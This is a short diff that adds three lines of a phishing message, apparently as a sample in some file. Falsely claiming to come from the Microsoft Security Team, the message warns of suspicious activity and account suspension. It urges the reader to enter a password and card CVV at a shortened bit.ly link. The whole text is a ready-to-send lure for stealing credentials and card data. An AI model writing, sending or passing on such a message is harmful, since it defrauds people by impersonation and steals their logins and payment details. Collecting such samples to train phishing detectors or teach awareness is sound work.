@@ -1,0 +1,3 @@
+Dear User, Microsoft Security Team has detected suspicious activity on your device.
+Your account will be blocked unless you verify your credentials at http://bit.ly/ms-verify
+Enter your password and CVV to confirm your identity. Act now to avoid suspension.
